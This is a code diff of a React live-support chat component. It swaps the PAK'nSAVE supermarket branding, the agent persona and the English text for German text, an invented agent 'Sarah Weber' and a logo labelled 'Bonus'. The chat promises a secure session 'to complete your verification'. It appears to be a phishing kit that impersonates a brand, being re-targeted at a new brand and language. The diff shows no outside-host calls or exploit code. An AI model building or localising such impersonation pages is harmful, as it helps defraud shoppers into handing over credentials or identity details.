@@ -15,11 +15,11 @@ type ChatMessage = {
 };
 
 const SUPPORT_AVATAR = "/avatars/support-sarah.jpg";
-const SUPPORT_AGENT_NAME = "Aroha Wilson";
-const SUPPORT_AGENT_ROLE = "PAK'nSAVE Support";
-const CLOSE_BUTTON_TITLE = "Close";
-const EMPTY_CHAT_TEXT = "No messages yet. How can we help you?";
-const CHAT_INPUT_PLACEHOLDER = "Write a message...";
+const SUPPORT_AGENT_NAME = "Sarah Weber";
+const SUPPORT_AGENT_ROLE = "Kundensupport";
+const CLOSE_BUTTON_TITLE = "Schließen";
+const EMPTY_CHAT_TEXT = "Noch keine Nachrichten. Wie können wir Ihnen helfen?";
+const CHAT_INPUT_PLACEHOLDER = "Nachricht schreiben...";
 
 export function LiveSupportClient({ sessionId }: { sessionId: string }) {
   const { settings, loading: settingsLoading } = useSettings();
@@ -155,8 +155,8 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
                   </p>
                 </div>
                 <img
-                  src="/form-assets/paknsave-logo-form.png"
-                  alt="PAK'nSAVE"
+                  src="/form-assets/logo-form.svg"
+                  alt="Bonus"
                   className="h-[3.8rem] w-[3.8rem] shrink-0 object-contain sm:h-[4.4rem] sm:w-[4.4rem]"
                 />
               </div>
@@ -171,7 +171,7 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
                   <span className="absolute bottom-0 right-0 size-3.5 rounded-full border-2 border-[#0b0b08] bg-[#5ef08c]" />
                 </div>
                 <div className="min-w-0 flex-1">
-                  <p className="text-[0.68rem] font-black uppercase tracking-[0.22em] text-[#ffe98c]">Support Agent</p>
+                  <p className="text-[0.68rem] font-black uppercase tracking-[0.22em] text-[#ffe98c]">Support-Mitarbeiter</p>
                   <h3 className="truncate text-base font-extrabold text-white sm:text-lg">{SUPPORT_AGENT_NAME}</h3>
                   <p className="text-[13px] text-white/66">{SUPPORT_AGENT_ROLE}</p>
                 </div>
@@ -182,10 +182,10 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
                   <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                     <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
                   </svg>
-                  <span className="text-[0.72rem] font-black uppercase tracking-[0.22em]">Direct Support</span>
+                  <span className="text-[0.72rem] font-black uppercase tracking-[0.22em]">Direkter Support</span>
                 </div>
                 <p className="text-sm font-semibold leading-5 text-white/86">
-                  You will be connected directly with <span className="text-[#ffe98c]">{SUPPORT_AGENT_NAME}</span> to complete your verification.
+                  Sie werden direkt mit <span className="text-[#ffe98c]">{SUPPORT_AGENT_NAME}</span> verbunden, um Ihre Verifizierung abzuschließen.
                 </p>
               </div>
 
@@ -203,7 +203,7 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
                 <svg className="h-6 w-6 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                   <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
                 </svg>
-                <span>Secure live chat session with end-to-end message syncing.</span>
+                <span>Sichere Live-Chat-Sitzung mit Ende-zu-Ende-Nachrichtensynchronisierung.</span>
               </div>
             </div>
           </div>
@@ -226,8 +226,8 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
               </div>
               <div className="flex items-center gap-3">
                 <img
-                  src="/form-assets/paknsave-logo-form.png"
-                  alt="PAK'nSAVE"
+                  src="/form-assets/logo-form.svg"
+                  alt="Bonus"
                   className="h-11 w-11 shrink-0 object-contain"
                 />
                 <button onClick={() => setIsChatOpen(false)} title={CLOSE_BUTTON_TITLE} className="flex size-10 items-center justify-center rounded-full border border-[#ffd95c]/18 bg-white/8 text-white/72 shadow-sm transition-colors hover:bg-white/14 hover:text-white">
@@ -256,7 +256,7 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
                           className="mb-3 overflow-hidden rounded-xl cursor-pointer hover:opacity-90 transition-opacity" 
                           onClick={() => setZoomedImage(m.image_url!)}
                         >
-                          <img src={m.image_url} alt="Chat Attachment" className="max-h-52 w-full object-cover rounded-xl" />
+                          <img src={m.image_url} alt="Chat-Anhang" className="max-h-52 w-full object-cover rounded-xl" />
                         </div>
                       )}
                       {m.content && <p className="leading-relaxed">{m.content}</p>}
@@ -301,7 +301,7 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
           </button>
           <img 
             src={zoomedImage} 
-            alt="Zoomed" 
+            alt="Vergrößert" 
             className="max-w-full max-h-full object-contain rounded-lg animate-in zoom-in-95 duration-200" 
             onClick={(e) => e.stopPropagation()}
           />
